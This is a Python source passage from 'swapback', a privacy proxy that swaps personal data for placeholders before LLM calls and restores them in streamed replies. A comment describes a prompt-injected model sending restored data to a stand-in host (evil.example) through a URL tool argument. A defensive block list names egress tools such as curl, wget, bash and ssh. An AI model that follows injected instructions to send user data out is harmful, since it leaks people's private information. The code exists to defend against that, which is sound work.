    def tool_keep(self, name, args, stats=None):
        """True when this tool call keeps its placeholders (the restore policy, see ToolPolicy). Counts a kept call
        that carries a placeholder as stats["tool_kept"]."""
        raw = args if isinstance(args, str) else json.dumps(args, ensure_ascii=False)
        pol = self.tool_policy()
        keep = pol.decide(name, raw, self.restore_text(raw, js=True) if pol.keep_if_url else None)
        if keep and stats is not None and self.has_placeholder(raw):
            stats["tool_kept"] = stats.get("tool_kept", 0) + 1
        return keep

    def has_placeholder(self, text):
        return bool(text) and bool(PH_RE.search(text) or JS_PH_RE.search(text) or
                                   (self.cfg.get("restore_bare", True) and BARE_RE.search(text)))

    def restore_obj(self, o, stats=None, key=None, forms=None):
        if isinstance(o, dict):
            tc = tool_call_args(o)
            if tc is not None and self.tool_keep(tc[0], o[tc[1]], stats):
                return {k: (v if k == tc[1] else self.restore_obj(v, stats, k, forms)) for k, v in o.items()}
            return {k: self.restore_obj(v, stats, k, forms) for k, v in o.items()}
        if isinstance(o, list):
            return [self.restore_obj(x, stats, key, forms) for x in o]
        if isinstance(o, str):
            return self.restore_text(o, js=(key == "arguments"), stats=stats, forms=forms)
        return o

    def stream_restorer(self, js=False, stats=None, forms=None):
        return StreamRestorer(self, js, stats, forms)


_BARE_TAIL = re.compile(r"(?<![A-Za-z0-9_])([A-Z][A-Z_]*\d*)$")
_TYPE_PREFIXES = {(t + "_")[:i] for t in TYPES for i in range(1, len(t) + 2)}
_BARE_FULL = re.compile(r"(?:" + "|".join(TYPES) + r")_\d+")


class StreamRestorer:
    """feed(chunk) -> text safe to emit now; a tail that may be a split placeholder waits for the next chunk."""

    def __init__(self, scr, js=False, stats=None, forms=None):
        self.s, self.js, self.stats, self.buf, self.forms = scr, js, stats, "", forms

    def _cut(self, b):
        if self.js:                                 # JSON text may carry the placeholder escaped: \u00abPERSON_1\u00bb
            low = b[-48:].lower()
            off = len(b) - len(low)
            i = low.rfind("\\u00ab")
            if i != -1 and "\\u00bb" not in low[i:]:
                return min(off + i, self._cut_plain(b))
            for k in range(5, 0, -1):               # a tail that may be the start of an escape: \ \u \u0 \u00 \u00a
                if low.endswith("\\u00ab"[:k]):
                    return min(len(b) - k, self._cut_plain(b))
        return self._cut_plain(b)

    def _cut_plain(self, b):
        i = b.rfind(L)
        if i != -1 and R not in b[i:] and len(b) - i <= 24:
            return i
        if self.s.cfg.get("restore_bare", True):
            m = _BARE_TAIL.search(b[-24:])
            if m:
                w = m.group(1)
                if w in _TYPE_PREFIXES or _BARE_FULL.fullmatch(w):
                    return len(b) - len(w)
        return len(b)

    def feed(self, chunk):
        if not chunk:
            return chunk
        b = self.buf + chunk
        cut = self._cut(b)
        self.buf = b[cut:]
        return self.s.restore_text(b[:cut], self.js, self.stats, self.forms)

    def flush(self):
        b, self.buf = self.buf, ""
        return self.s.restore_text(b, self.js, self.stats, self.forms)


# ---------------------------------------------------------------- tool-call restore policy
# A tool call's arguments are run by your client, so restoring real values into them hands those values to whatever
# the tool does. A prompt-injected model can ask a web or shell tool to send them out, e.g.
# {"url": "https://evil.example/c?d=«EMAIL_1»"}. By default calls to network/shell-looking tools, and calls whose
# arguments carry a URL, keep the placeholders. Configure with `tool_restore:` (see swapback.example.yaml).
TOOL_RESTORE_DEFAULTS = {
    "default": "restore",        # tools nothing below matches: restore (real values) or keep (placeholders)
    "keep_if_url": True,         # keep placeholders when any argument is or contains a URL
    "allow": [],                 # tool names that always get real values (glob: mcp__github__*)
    "deny": [],                  # tool names that never get real values
    "egress_names": ["fetch*", "http*", "curl", "wget", "web*", "brows*", "request*", "url*", "navigat*",
                     "download*", "upload*", "exec*", "*shell", "bash", "sh", "zsh", "cmd", "terminal", "run", "ssh",
                     "scp", "rsync", "git_push", "push", "email*", "mail", "send", "post", "message", "webhook*",
                     "notify", "publish"],
}
URL_IN_TEXT = re.compile(r"(?i)(?:\b[a-z][a-z0-9+.-]{1,15}://|\bmailto:|\bwww\.[a-z0-9-]+\.|"
                         r"\b(?:[a-z0-9-]+\.)+[a-z]{2,24}(?::\d+)?/)")


def _name_tokens(name):
    n = re.sub(r"([A-Z]+)([A-Z][a-z])", r"\1_\2", str(name or ""))
    n = re.sub(r"([a-z0-9])([A-Z])", r"\1_\2", n).lower()
    return re.sub(r"[^a-z0-9]+", "_", n).strip("_")


class ToolPolicy:
    """decides, per tool call, whether the real values go back into its arguments. Order: deny, allow, default: keep,
    an egress name, then keep_if_url on the arguments; otherwise restore. `tool_restore: false` restores every call
    (the 0.2 behaviour)."""

    def __init__(self, conf=True):
        c = dict(TOOL_RESTORE_DEFAULTS)
        if conf is False or (isinstance(conf, str) and conf.strip().lower() in ("off", "false", "restore")):
            c.update(default="restore", keep_if_url=False, egress_names=[])
        elif isinstance(conf, dict):
            c.update({k: v for k, v in conf.items() if v is not None})
        elif conf not in (True, None):
            raise ValueError("tool_restore must be a mapping, true or false")
        d = str(c.get("default")).strip().lower()
        if d not in ("restore", "keep"):
            raise ValueError("tool_restore.default must be restore or keep")
        self.default, self.keep_if_url = d, bool(c.get("keep_if_url"))
        lists = {}
        for k in ("allow", "deny", "egress_names"):
            v = c.get(k) or []
            if isinstance(v, str):
                v = [v]
            if not isinstance(v, list):
                raise ValueError("tool_restore.%s must be a list" % k)
            lists[k] = [str(x).strip().lower() for x in v if str(x).strip()]
        self.allow, self.deny = lists["allow"], lists["deny"]
        self.egress = [re.compile(r"(?:^|_)" + "[a-z0-9]*".join(re.escape(_name_tokens(x)) for x in p.split("*"))
                                  + r"(?:$|_)") for p in lists["egress_names"]]
        self.counts = {"allow": len(self.allow), "deny": len(self.deny), "egress_names": len(self.egress)}

    @staticmethod
    def _listed(name, lst):
        n = str(name or "").lower()
        return any(fnmatch.fnmatchcase(n, p) for p in lst)

    def by_name(self, name):
        """'keep' or 'restore' when the name decides; None when it depends on the arguments."""
        if self._listed(name, self.deny):
            return "keep"
        if self._listed(name, self.allow):
            return "restore"
        if self.default == "keep":
            return "keep"
        n = _name_tokens(name)
        if n and any(rx.search(n) for rx in self.egress):
            return "keep"
        return None if self.keep_if_url else "restore"

    def decide(self, name, raw, restored=None):
        """True = keep placeholders. raw: the arguments as the model wrote them; restored: with values put back."""
        r = self.by_name(name)
        if r is None:
            r = "keep" if (URL_IN_TEXT.search(raw or "") or (restored and URL_IN_TEXT.search(restored))) else "restore"
        return r == "keep"


def tool_call_args(o):
    """(tool name, key of its arguments) when dict o is a tool call the client will run, else None. Shapes: OpenAI
    chat `function` / legacy `function_call` and Responses `function_call` ({name, arguments}), Anthropic `tool_use`
    ({name, input}), Responses `custom_tool_call` ({name, input}) and `local_shell_call` ({action})."""
    t = o.get("type")
    if isinstance(o.get("name"), str) and "arguments" in o:
        return o["name"], "arguments"
    if t in ("tool_use", "custom_tool_call") and "input" in o:
        return str(o.get("name") or ""), "input"
    if t == "local_shell_call" and "action" in o:
        return "local_shell", "action"
    return None


def add_system_note(body, note, api=None, swapped=True):
    """the "keep placeholders as written" note. Appended to an existing system prompt (OpenAI system/developer
    message with string or list content, Anthropic top-level `system` string or blocks, Responses `instructions`);
    when there is none, one is created, but only if this request carries placeholders."""
    if api is None:
        api = "anthropic" if "system" in body else "responses" if ("input" in body and "messages" not in body) else "chat"

    def has(v):
        if isinstance(v, str):
            return note in v
        if isinstance(v, list):
            return any(isinstance(b, dict) and note in str(b.get("text") or "") for b in v)
        return False

    def extend(v):
        if isinstance(v, str):
            return v + "\n\n" + note if v else note
        if isinstance(v, list):
            return v + [{"type": "text", "text": note}]
        return v
    if api == "anthropic":
        s = body.get("system")
        if s and not has(s) and isinstance(s, (str, list)):
            body["system"] = extend(s)
        elif not s and swapped:
            body["system"] = note
        return
    if api == "responses" or ("instructions" in body and "messages" not in body):
        s = body.get("instructions")
        if s and isinstance(s, str) and not has(s):
            body["instructions"] = extend(s)
        elif not s and swapped:
            body["instructions"] = note
        return
    msgs = body.get("messages")
    if not isinstance(msgs, list):
        return
    m0 = msgs[0] if msgs and isinstance(msgs[0], dict) else None
    if m0 is not None and m0.get("role") in ("system", "developer"):
        c = m0.get("content")
        if isinstance(c, (str, list)) and c and not has(c):
            m0["content"] = extend(c)
        elif not c and swapped:
            m0["content"] = note
    elif swapped:
        msgs.insert(0, {"role": "system", "content": note})


class ToolArgsStream:
    """streamed tool-call arguments under the restore policy (feed/flush like StreamRestorer). When the tool's name
    decides, pieces are restored (or passed as written) as they arrive; when the decision needs the whole arguments
    (keep_if_url), they are held and sent at the end of the call, restored or not."""

    def __init__(self, scr, js=True, stats=None, forms=None, name=None):
        self.s, self.stats, self.js = scr, stats, js
        self.inner = StreamRestorer(scr, js, stats, forms)
        self.name, self.mode, self.tried, self.done, self.raw = name or "", None, False, False, []

    def add_name(self, piece):
        if not self.tried and isinstance(piece, str):
            self.name += piece

    def feed(self, chunk):
        if not chunk:
            return chunk
        self.raw.append(chunk)
        if not self.tried:
            self.tried = True
            self.mode = self.s.tool_policy().by_name(self.name)
        if self.mode is None:
            return ""
        return self.inner.feed(chunk) if self.mode == "restore" else chunk

    def flush(self):
        if self.done:
            return ""
        self.done = True
        full = "".join(self.raw)
        if self.mode is None:
            if not full:
                return ""
            keep = self.s.tool_policy().decide(self.name, full, self.s.restore_text(full, self.js))
            self.mode = "keep" if keep else "restore"
            out = (self.inner.feed(full) + self.inner.flush()) if self.mode == "restore" else full
        else:
            out = self.inner.flush() if self.mode == "restore" else ""
        if self.mode == "keep" and self.stats is not None and self.s.has_placeholder(full):
            self.stats["tool_kept"] = self.stats.get("tool_kept", 0) + 1
        return out


def restore_sse_event(scr, ev, state):
    """ev = parsed chat.completion.chunk dict; state = per-stream dict of restorers. Mutates ev."""
    for ch in ev.get("choices") or []:
        i = ch.get("index", 0)
        d = ch.get("delta") or {}
        for f in ("content", "reasoning_content", "reasoning"):
            if isinstance(d.get(f), str):
                r = state.setdefault((i, f), scr.stream_restorer(False, state.setdefault("_stats", {}), state.get("_forms")))
                d[f] = r.feed(d[f])
        for tc in d.get("tool_calls") or []:
            fn = tc.get("function") or {}
            k = (i, "tc", tc.get("index", 0))
            r = state.get(k)
            if r is None:
                r = state[k] = ToolArgsStream(scr, True, state.setdefault("_stats", {}), state.get("_forms"))
            r.add_name(fn.get("name"))
            if isinstance(fn.get("arguments"), str):
                fn["arguments"] = r.feed(fn["arguments"])
        if ch.get("finish_reason"):
            _flush_choice(scr, ch, i, state)
    return ev


def _flush_choice(scr, ch, i, state):
    d = ch.setdefault("delta", {})
    for k, r in list(state.items()):
        if not isinstance(k, tuple) or k[0] != i:
            continue
        rest = r.flush()
        if not rest:
            continue
        if k[1] == "tc":
            tcs = d.setdefault("tool_calls", [])
            tc = next((t for t in tcs if t.get("index", 0) == k[2]), None)
            if tc is None:
                tc = {"index": k[2], "function": {"arguments": ""}}
                tcs.append(tc)
            fn = tc.setdefault("function", {})
            fn["arguments"] = (fn.get("arguments") or "") + rest
        else:
            d[k[1]] = (d.get(k[1]) or "") + rest


ANTHROPIC_EVENTS = frozenset(("message_start", "content_block_start", "content_block_delta", "content_block_stop",
                              "message_delta", "message_stop", "ping", "error"))
_ANTH_FIELDS = {"text_delta": ("text", False), "input_json_delta": ("partial_json", True)}


def is_anthropic_event(ev):
    return isinstance(ev, dict) and ev.get("type") in ANTHROPIC_EVENTS and "choices" not in ev


def restore_anthropic_event(scr, ev, state):
    """Anthropic /v1/messages stream event (parsed `data:` JSON); state = per-stream dict. Mutates ev and returns a
    list of extra content_block_delta events to send BEFORE it: a placeholder split across deltas is held back until it
    is whole, and what is held is flushed just before the block's content_block_stop (or message_stop). text_delta is
    restored as text, input_json_delta (tool_use input) as JSON text. thinking deltas are left as sent (signed)."""
    rs = state.setdefault("_anth", {})
    stats = state.setdefault("_stats", {})
    forms = state.get("_forms")
    t = ev.get("type")
    if t == "content_block_start" and isinstance(ev.get("content_block"), dict):
        cb = ev["content_block"]
        if cb.get("type") in ("text", "tool_use"):
            ev["content_block"] = scr.restore_obj(cb, stats, forms=forms)
        if cb.get("type") == "tool_use":            # its input_json_delta pieces go through the restore policy
            rs[ev.get("index", 0)] = ("input_json_delta", ToolArgsStream(scr, True, stats, forms, cb.get("name")))
        return []
    if t == "content_block_delta":
        d = ev.get("delta") or {}
        f = _ANTH_FIELDS.get(d.get("type"))
        if f and isinstance(d.get(f[0]), str):
            i = ev.get("index", 0)
            r = rs.get(i)
            if r is None:
                r = rs[i] = (d["type"], scr.stream_restorer(f[1], stats, forms))
            d[f[0]] = r[1].feed(d[f[0]])
        return []
    if t == "content_block_stop":
        return _anth_flush(rs, [ev.get("index", 0)])
    if t == "message_stop":
        return _anth_flush(rs, sorted(rs))
    return []


def _anth_flush(rs, idx):
    out = []
    for i in idx:
        r = rs.pop(i, None)
        if r is None:
            continue
        rest = r[1].flush()
        if rest:
            out.append({"type": "content_block_delta", "index": i, "delta": {"type": r[0], _ANTH_FIELDS[r[0]][0]: rest}})
    return out


def flush_anthropic(state):
    """leftovers at EOF of an Anthropic stream -> extra content_block_delta events (normally empty)."""
    return _anth_flush(state.get("_anth") or {}, sorted(state.get("_anth") or {}))


def flush_all(scr, state, template=None):
    """leftovers at [DONE]/EOF -> one synthetic chunk (or None)."""
    ev = dict(template or {})
    ev["choices"] = []
    idx = sorted({k[0] for k in state if isinstance(k, tuple) and isinstance(k[0], int)})
    for i in idx:
        ch = {"index": i, "delta": {}, "finish_reason": None}
        _flush_choice(scr, ch, i, state)
        if ch["delta"]:
            ev["choices"].append(ch)
    return ev if ev["choices"] else None


# ---------------------------------------------------------------- OpenAI Responses API streams
_RESP_TEXT = {"response.output_text.delta": ("delta", "response.output_text.done", "text"),
              "response.refusal.delta": ("delta", "response.refusal.done", "refusal"),
              "response.reasoning_summary_text.delta": ("delta", "response.reasoning_summary_text.done", "text"),
              "response.reasoning_text.delta": ("delta", "response.reasoning_text.done", "text")}
_RESP_DONE = {v[1]: (k, v[2]) for k, v in _RESP_TEXT.items()}
_RESP_TOOL = {"response.function_call_arguments.delta": ("response.function_call_arguments.done", "arguments"),
              "response.custom_tool_call_input.delta": ("response.custom_tool_call_input.done", "input")}
_RESP_TOOL_DONE = {v[0]: (k, v[1]) for k, v in _RESP_TOOL.items()}


def is_responses_event(ev):
    return isinstance(ev, dict) and str(ev.get("type") or "").startswith("response.") and "choices" not in ev


def _rkey(ev, kind):
    return ("resp", kind, ev.get("output_index", 0), ev.get("content_index", ev.get("summary_index", 0)))


def restore_responses_event(scr, ev, state):
    """OpenAI Responses API stream event (parsed `data:` JSON); state = per-stream dict. Mutates ev and returns a list
    of extra delta events to send BEFORE it. Text deltas (output_text, refusal, reasoning) are restored with a split
    placeholder held until whole; function_call_arguments / custom_tool_call_input deltas go through the tool restore
    policy (ToolArgsStream). What is held is sent as one more delta just before the matching `.done` event. Snapshots
    (`.done` events, output_item.*, content_part.*, response.created/completed) are restored whole, tool items under
    the same policy. sequence_number is renumbered so it stays unique and increasing when a delta is added."""
    stats = state.setdefault("_stats", {})
    forms = state.get("_forms")
    rs = state.setdefault("_resp", {})
    t = ev.get("type")
    pre = []
    if t in _RESP_TEXT:
        k = _rkey(ev, t)
        ent = rs.get(k)
        if ent is None:
            ent = rs[k] = {"r": scr.stream_restorer(False, stats, forms)}
        _resp_feed(ent, ev)
    elif t in _RESP_TOOL:
        k = ("resp", "tool", ev.get("output_index", 0))
        ent = rs.get(k)
        if ent is None:
            ent = rs[k] = {"r": ToolArgsStream(scr, True, stats, forms, state.setdefault("_resp_names", {}).get(ev.get("output_index", 0)))}
        _resp_feed(ent, ev)
    elif t in _RESP_DONE:
        dt, field = _RESP_DONE[t]
        ent = rs.get(_rkey(ev, dt))
        pre += _resp_flush(rs, [_rkey(ev, dt)])
        if isinstance(ev.get(field), str):              # the snapshot says what the restored deltas said
            ev[field] = ent["out"] if ent is not None and ent["raw"] == ev[field] else \
                scr.restore_text(ev[field], False, None, None)
    elif t in _RESP_TOOL_DONE:
        k = ("resp", "tool", ev.get("output_index", 0))
        ent = rs.get(k)
        pre += _resp_flush(rs, [k])
        field = _RESP_TOOL_DONE[t][1]
        if isinstance(ev.get(field), str):
            if ent is not None and ent["raw"] == ev[field]:
                ev[field] = ent["out"]
            elif not scr.tool_keep(ev.get("name") or state.setdefault("_resp_names", {}).get(ev.get("output_index", 0)) or "",
                                   ev[field]):
                ev[field] = scr.restore_text(ev[field], True, None, None)
    elif t in ("response.output_item.added", "response.output_item.done") and isinstance(ev.get("item"), dict):
        item = ev["item"]
        if t == "response.output_item.added" and tool_call_args(item) is not None:
            state.setdefault("_resp_names", {})[ev.get("output_index", 0)] = tool_call_args(item)[0]
        if t == "response.output_item.done":
            oi = ev.get("output_index", 0)
            pre += _resp_flush(rs, [k for k in list(rs) if k[2] == oi])
        ev["item"] = scr.restore_obj(item, None, forms=None)
    elif t in ("response.content_part.added", "response.content_part.done") and isinstance(ev.get("part"), dict):
        ev["part"] = scr.restore_obj(ev["part"], None, forms=None)
    elif t == "response.output_text.annotation.added" and isinstance(ev.get("annotation"), dict):
        ev["annotation"] = scr.restore_obj(ev["annotation"], None, forms=None)
    elif isinstance(ev.get("response"), dict):            # created / in_progress / completed / incomplete / failed
        if t in ("response.completed", "response.incomplete", "response.failed"):
            pre += _resp_flush(rs, list(rs))
        ev["response"] = scr.restore_obj(ev["response"], None, forms=None)
    return _resp_seq(state, pre, ev)


def _resp_feed(ent, ev):
    ent["tmpl"] = dict(ev)
    if isinstance(ev.get("delta"), str):
        ent["raw"] = ent.get("raw", "") + ev["delta"]
        ev["delta"] = ent["r"].feed(ev["delta"])
        ent["out"] = ent.get("out", "") + ev["delta"]


def _resp_flush(rs, keys):
    out = []
    for k in keys:
        ent = rs.pop(k, None)
        if ent is None:
            continue
        rest = ent["r"].flush()
        ent.setdefault("raw", "")
        ent["out"] = ent.get("out", "") + rest
        if rest and ent.get("tmpl"):
            e = dict(ent["tmpl"])
            e["delta"] = rest
            out.append(e)
    return out


def _resp_seq(state, pre, ev):
    off = state.get("_resp_seq", 0)
    if isinstance(ev.get("sequence_number"), int):
        for n, e in enumerate(pre):
            e["sequence_number"] = ev["sequence_number"] + off + n
        off += len(pre)
        ev["sequence_number"] += off
    state["_resp_seq"] = off
    return pre


def flush_responses(state):
    """leftovers at EOF of a Responses stream -> extra delta events (normally empty)."""
    rs = state.get("_resp") or {}
    return _resp_flush(rs, list(rs))


# ---------------------------------------------------------------- alerts (optional generic webhook)
def alert(cfg, text):
    """POST {"text": "swapback: ..."} to cfg alert_webhook (Slack/Discord-compatible incoming webhook), at most once
    per alert_min_interval_s. The text never includes a value. Returns a status word."""
    import urllib.request
    url = cfg.get("alert_webhook")
    if not url:
        return "no_webhook"
    p = os.path.join(state_dir(cfg), "alert_last.json")
    try:
        last = json.load(open(p)).get("ts", 0)
    except (OSError, ValueError):
        last = 0
    if time.time() - last < float(cfg.get("alert_min_interval_s", 3600)):
        return "rate_limited"
    try:
        req = urllib.request.Request(url, method="POST", data=json.dumps({"text": "swapback: " + text[:300]}).encode(),
                                     headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=8) as r:
            ok = 200 <= r.status < 300
        _write_private(p, {"ts": time.time(), "ok": ok})
        return "sent" if ok else "refused"
    except Exception as e:
        return "error:" + type(e).__name__


# ---------------------------------------------------------------- health + canary
def _http(method, url, body=None, headers=None, timeout=120):
    import urllib.request
    req = urllib.request.Request(url, data=json.dumps(body).encode() if body is not None else None, method=method,
                                 headers=dict({"Content-Type": "application/json"}, **(headers or {})))
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.status, json.loads(r.read() or b"{}")


def health(cfg=None):
    cfg = cfg or load_cfg()
    try:
        return _http("GET", "http://%s/scrubber/health" % cfg["listen"], timeout=5)[1]
    except Exception as e:
        return {"ok": False, "error": type(e).__name__}


def canary(cfg=None, model=None, auth=None):
    """Send a fake person + email through the running proxy and prove the provider got placeholders only:
    1) raw mode (X-Scrubber-Raw: 1): the provider's echo must not hold the fake values;
    2) normal mode: the swap-back must give the fake values back. auth: Authorization header value
    (default: "Bearer $OPENAI_API_KEY" when set)."""
    cfg = cfg or load_cfg()
    model = model or cfg.get("canary_model")
    res = {"ts": time.strftime("%Y-%m-%dT%H:%M:%S"), "mode": cfg["mode"], "health": health(cfg)}
    if not model:
        res.update(error="set canary_model (config) or SWAPBACK_CANARY_MODEL", **{"pass": False})
        return res
    fake = [v for v, _ in CANARY]
    msg = {"model": model, "stream": False, "max_tokens": 80, "temperature": 0,
           "messages": [{"role": "system", "content": "You copy text exactly. Output only the copied text."},
                        {"role": "user", "content": "Copy this line exactly: Contact %s at %s about the canary." % tuple(fake)}]}
    url = "http://%s/v1/chat/completions" % cfg["listen"]
    auth = auth or ("Bearer " + os.environ["OPENAI_API_KEY"] if os.environ.get("OPENAI_API_KEY") else None)
    h = {"Authorization": auth} if auth else {}
    try:
        _, raw = _http("POST", url, json.loads(json.dumps(msg)), dict(h, **{"X-Scrubber-Raw": "1"}))
        rt = ((raw.get("choices") or [{}])[0].get("message") or {}).get("content") or ""
        res["provider_saw_fake"] = any(f.lower() in rt.lower() for f in fake)
        res["provider_echoed_placeholder"] = bool(re.search(L + r"(PERSON|EMAIL)_\d+" + R, rt))
        _, rest = _http("POST", url, json.loads(json.dumps(msg)), h)
        tt = ((rest.get("choices") or [{}])[0].get("message") or {}).get("content") or ""
        res["restored_fake_back"] = any(f.lower() in tt.lower() for f in fake)
    except Exception as e:
        res["error"] = "request: " + type(e).__name__
    res["pass"] = cfg["mode"] == "on" and "error" not in res and not res.get("provider_saw_fake") \
        and bool(res.get("restored_fake_back"))
    _write_private(os.path.join(state_dir(cfg), "canary.json"), res)
    if not res["pass"] and cfg["mode"] == "on":
        alert(cfg, "canary FAILED (%s)" % (", ".join(k for k in ("provider_saw_fake", "error") if res.get(k)) or "check"))
    return res


CLI_ENV_HELP = '''configuration (environment):
  SWAPBACK_CONFIG     path to the YAML config file. Default: ./swapback.yaml if it
                      exists, else built-in defaults. The pre-0.2 name
                      PII_SCRUBBER_CONFIG is still read when SWAPBACK_CONFIG is unset
                      (deprecated); every SWAPBACK_* variable has the same fallback.
  SWAPBACK_LISTEN     host:port the proxy listens on (default 127.0.0.1:8787), or
                      `listen:` in the config. Off loopback also needs
                      `allow_remote: true` in the config.
  SWAPBACK_UPSTREAM   provider base URL (default https://api.openai.com), or
                      `upstream:` in the config.
  also: SWAPBACK_MODE, SWAPBACK_KNOWN_FILE, SWAPBACK_PRIVATE_TERMS,
        SWAPBACK_STATE_DIR, SWAPBACK_ALERT_WEBHOOK, SWAPBACK_CANARY_MODEL.
  Environment variables override the config file. See swapback.example.yaml.'''

_COMMANDS = (
    ("stats", "counts for the loaded config and vault (default command)",
     "Print counts for the loaded config: known values, private rules, vault size. Never prints a value."),
    ("check-config", "show what the proxy would load (counts per type, never values)",
     "Load the config the way the proxy does and print the mode, listen address, upstream, state directory, and "
     "counts per type of known values and private terms. Never prints a value. Run it before starting the proxy; a "
     "broken config fails here."),
    ("health", "status of the running proxy (mode, counters, last error)",
     "Ask the running proxy at the config's listen address for its status (GET /scrubber/health): mode, request "
     "and block counters, last error."),
    ("canary", "end-to-end check through the running proxy (exit 1 on failure)",
     "Send a fake name and email through the running proxy to the real provider. Passes when the provider saw only "
     "placeholders and the reply got the values back; exits 1 otherwise. Needs canary_model in the config or "
     "SWAPBACK_CANARY_MODEL, and the provider's key (OPENAI_API_KEY)."),
    ("init", "write a starter swapback.yaml and known.yaml (from the examples shipped in the package)",
     "Write swapback.yaml, known.yaml and private_terms.example.yaml into the current directory (or --dir) from the example files shipped with "
     "the package, with 0600 permissions. Existing files are left alone unless --force. Edit known.yaml (or build it "
     "with `swapback known init`), then run `swapback check-config`."),
    ("scrub-file", "scrub one request JSON locally and print counts and time",
     "Scrub one OpenAI-style request JSON file locally (nothing is sent anywhere) and print the counts per type and "
     "the time it took. Never prints a value."),
)


EXAMPLES = (("swapback.example.yaml", "swapback.yaml"), ("known.example.yaml", "known.yaml"),
            ("private_terms.example.yaml", "private_terms.example.yaml"))


def example_text(name):
    """the text of an example file shipped in the package (swapback/examples/)."""
    from importlib import resources
    return resources.files("swapback").joinpath("examples", name).read_text(encoding="utf-8")


def init_files(d=".", force=False):
    """write swapback.yaml and known.yaml from the packaged examples (0600). Prints what it did; returns an exit code."""
    os.makedirs(d, exist_ok=True)
    done = {}
    for src, dst in EXAMPLES:
        p = os.path.join(d, dst)
        if os.path.exists(p) and not force:
            done[dst] = "exists (kept; --force to overwrite)"
            continue
        fd = os.open(p, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        with os.fdopen(fd, "w", encoding="utf-8") as f:
            f.write(example_text(src))
        os.chmod(p, 0o600)
        done[dst] = "written"
    print(json.dumps({"dir": os.path.abspath(d), "files": done,
                      "next": "edit known.yaml (or: swapback known init), then: swapback check-config"}))
    return 0


def _version():
    from . import __version__
    return __version__


def cli_parser():
    import argparse
    ap = argparse.ArgumentParser(
        prog="swapback", formatter_class=argparse.RawDescriptionHelpFormatter,
        description="swapback: swap personal data for placeholders before an LLM call and put it back in the reply.\n"
                    "These commands inspect the config and the running proxy; `swapback-proxy` starts the proxy.",
        epilog=CLI_ENV_HELP + "\n\nWith no command, swapback runs `stats`. `swapback COMMAND --help` describes one command.")
    ap.add_argument("--version", action="version", version="swapback " + _version())
    sub = ap.add_subparsers(dest="cmd", metavar="COMMAND", title="commands")
    for name, short, desc in _COMMANDS:
        sp = sub.add_parser(name, help=short, description=desc)
        if name == "scrub-file":
            sp.add_argument("file", metavar="IN.json", help="an OpenAI-style request body (JSON)")
        if name == "init":
            sp.add_argument("--dir", default=".", help="where to write the files (default: the current directory)")
            sp.add_argument("--force", action="store_true", help="overwrite existing files")
    from . import known
    known.add_parser(sub)
    return ap


def main(argv=None):
    argv = sys.argv if argv is None else argv
    args = cli_parser().parse_args(argv[1:])          # --help/--version/bad input exit here, before any config load
    cmd = args.cmd or "stats"
    if cmd == "init":                                 # needs no config: it writes one
        sys.exit(init_files(args.dir, args.force))
    if cmd == "known":                                # works without a config; uses its known_file when there is one
        from . import known
        try:
            kcfg = load_cfg()
        except Exception:
            kcfg = dict(DEFAULTS)
        sys.exit(known.run(args, kcfg))
    cfg = load_cfg()
    if cmd == "stats":
        s = Scrubber(cfg)
        print(json.dumps({"mode": cfg["mode"], "known": len(s.known), "private_rules": len(s.private),
                          "vault": len(s.rev), "ctr": s.ctr}))
    elif cmd == "check-config":
        out = {"mode": cfg["mode"], "listen": cfg["listen"], "upstream": cfg["upstream"], "state_dir": state_dir(cfg)}
        tp = ToolPolicy(cfg.get("tool_restore", True))
        out["tool_restore"] = dict(default=tp.default, keep_if_url=tp.keep_if_url, **tp.counts)
        if cfg.get("known_file"):
            k = load_known(cfg["known_file"])
            by = {}
            for _, t in k:
                by[t] = by.get(t, 0) + 1
            out["known_by_type"] = by
        if cfg.get("private_terms_file"):
            out["private"] = build_private_terms(cfg["private_terms_file"])[1]
        if cfg.get("hooks"):
            from . import hooks as _hooks
            h = _hooks.Hooks(cfg)                       # imports the module; setup() runs only in the proxy
            out["hooks"] = {"module": h.name, "functions": sorted(h.fns)}
        print(json.dumps(out))
    elif cmd == "scrub-file":
        s = Scrubber(cfg)
        counts = {}
        t0 = time.perf_counter()
        with open(args.file, encoding="utf-8") as f:
            body = json.load(f)
        s.scrub_request(body, counts)
        print(json.dumps({"counts": counts, "ms": round((time.perf_counter() - t0) * 1000, 2)}))
    elif cmd == "health":
        print(json.dumps(health(cfg)))
    elif cmd == "canary":
        r = canary(cfg)
        print(json.dumps(r))
        sys.exit(0 if r["pass"] else 1)


if __name__ == "__main__":
    main()
